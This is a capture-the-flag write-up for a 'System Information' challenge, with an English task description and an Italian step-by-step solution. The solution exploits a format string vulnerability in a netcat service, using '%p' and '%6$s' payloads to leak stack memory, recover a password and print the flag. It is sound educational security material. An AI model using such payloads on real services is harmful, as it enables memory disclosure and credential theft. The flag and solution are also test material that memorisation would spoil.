# System Information

You have gained access to a inventory tool that lets you retrieve system information from a remote
machine, however the flag is still hidden behind a login prompt. Can you find a way to bypass the
login and retrieve the flag?

*Hint:* Connect to the service using netcat `nc <ip> <port>`

# Challenge

The player has only access to the remote service with a repl through netcat. When running the `?`
command, the player can see a list of available commands, which includes the command `flag`. The
command info does provide some information to the user, but is at last a red herring. When running
the `flag` command, they can notice that the command will echo the password provided by the user.
With some more testing, the player can find that they actually control the format string with the
password.

# Soluzione 

1. Avvio il sistema: bash build.sh 

2. Avvio il Docker (Dal docker file so che la porta è la 4444):  docker run --rm -p 4444:4444 wpctf2025-challenges:system_information

3. Da un altro terminale avvio il programma: nc 127.0.0.1 4444 

4. Dal codice main.c vedo che per stampare ogni variabile (Compresa la flag) usa print(variabile) --> **Format string vulnerability** 

5. Con questa vulnerabilità so che se passso parametri pcme %s, %p, %x, %n, printf crede che io gli abbia passato degli argomenti e va a leggerli dal registro e stack --> **posso leggere la memoria del processo** 

- Differenza: 
    - %s, %p, %x leggono la memroia --> ci serve 
    - %n --> scrivono in memoria --> non ci serve 
    
    
6. Inzio a passare al parametro flag degli attributi: 

    - flag %p %p %p %p %p -->  Incorrect password. '0x605dbc06d205 (nil) (nil) 0x605df495a2c4 (nil)' --> Le posizioni dalla 1 alla 5 sono registri di memoria (questo lo so perche se traduco in ASCII 0x605dbc06d205 non mi restiuisce nulla anzi) 

7. Vado avanti a passargli parametri : flag %6$p %7$p %8$p %9$p %10$p %11$p %12$p %13$p %14$p %15$p

    - COme sempre faccio i controlli e vedo che alla posizione 14 posso tradurlo in ascii --> 0x2436252067616c66 IN ASCII --> $6% galf --> letta al contrario --> flag %6$ --> dice di stampare la stringa (s) alla sesta posizione (6$)
    
8. flag %6$s --> my-password-a665c125a235a785d19d2ede82558604

9. flag my-password-a665c125a235a785d19d2ede82558604 --> Congratulations! Here is your flag: WPCTF{d0n7_y0u_l0v3_v4r14d1c_p4r4m373r5}

